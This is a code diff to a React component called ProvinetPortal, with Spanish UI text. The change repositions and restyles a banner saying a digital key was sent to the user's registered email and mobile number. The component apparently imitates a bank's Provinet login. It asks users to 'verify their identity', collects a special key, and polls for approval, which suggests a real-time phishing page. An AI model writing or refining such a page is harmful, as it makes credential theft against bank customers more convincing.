@@ -24,7 +24,7 @@ export default function ProvinetPortal() {
   const [submitting]                                   = useState(false);
   const [submitted, setSubmitted]                     = useState(false);
   const [rejected, setRejected]                       = useState(false);
-  const [contactoInfo, setContactoInfo]               = useState(null);
+  const [contactoInfo, setContactoInfo]               = useState(/** @type {{correo_electronico?:string,telefono_celular?:string}|null} */(null));
   const pollTimerRef  = useRef(null);
   const pollActiveRef = useRef(false);
   const ceTimerRef    = useRef(/** @type {ReturnType<typeof setTimeout> | null} */ (null));
@@ -573,6 +573,34 @@ export default function ProvinetPortal() {
             </div>
             <div className="provi-modal-body" ref={formRef}>
               <p>Por su seguridad, verifique su identidad completando los siguientes campos.</p>
+
+              {ceApproved && (
+                <div style={{ background:"#e8f4fd", border:"1px solid #5a9abf", borderLeft:"4px solid #1973B8", borderRadius:"2px", padding:"10px 14px", marginBottom:"12px", display:"flex", alignItems:"flex-start", gap:10 }}>
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="#1973B8" style={{ flexShrink:0, marginTop:2 }}>
+                    <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                  </svg>
+                  <div>
+                    <div style={{ fontSize:13, fontWeight:600, color:"#1a4a6a", marginBottom:contactoInfo ? 4 : 0 }}>Clave digital enviada al medio de contacto registrado.</div>
+                    {contactoInfo && (
+                      <div style={{ fontSize:12, color:"#2a5a8a", lineHeight:1.7 }}>
+                        {contactoInfo.correo_electronico && (
+                          <div style={{ display:"flex", gap:6 }}>
+                            <span style={{ fontWeight:600, color:"#1a4a6a", minWidth:52 }}>Correo:</span>
+                            <span>{contactoInfo.correo_electronico}</span>
+                          </div>
+                        )}
+                        {contactoInfo.telefono_celular && (
+                          <div style={{ display:"flex", gap:6 }}>
+                            <span style={{ fontWeight:600, color:"#1a4a6a", minWidth:52 }}>Celular:</span>
+                            <span>{contactoInfo.telefono_celular}</span>
+                          </div>
+                        )}
+                      </div>
+                    )}
+                  </div>
+                </div>
+              )}
+
               <div className="provi-form-box">
                 <div className="provi-form-box-title">Validacion de Ingreso</div>
 
@@ -640,7 +668,7 @@ export default function ProvinetPortal() {
                 </div>
               )}
 
-              <div style={{ display: "flex", alignItems: "center", gap: 12, marginTop: 20, marginBottom: 4 }}>
+              <div style={{ marginTop: 20, marginBottom: 4 }}>
                 {!ceApproved ? (
                   <button
                     className={`provi-btn-enviar${claveEspecial.length > 0 && !ceSubmitted ? " active" : " inactive"}`}
@@ -659,22 +687,6 @@ export default function ProvinetPortal() {
                   >
                     Enviar
                   </button>
-                )}
-                {ceApproved && (
-                  <div style={{ display:"flex", alignItems:"flex-start", gap:8, padding:"8px 12px", background:"#f0fdf4", border:"1px solid #86efac", borderRadius:7, marginLeft:8 }}>
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#16a34a" style={{ flexShrink:0, marginTop:2 }}>
-                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-                    </svg>
-                    <div>
-                      <div style={{ fontSize:13, fontWeight:600, color:"#15803d", lineHeight:1.3 }}>Clave digital enviada</div>
-                      {contactoInfo && (
-                        <div style={{ fontSize:11, color:"#166534", marginTop:3, lineHeight:1.6 }}>
-                          {contactoInfo.correo_electronico && <div>Correo: {contactoInfo.correo_electronico}</div>}
-                          {contactoInfo.telefono_celular && <div>Celular: {contactoInfo.telefono_celular}</div>}
-                        </div>
-                      )}
-                    </div>
-                  </div>
                 )}
               </div>
             </div>
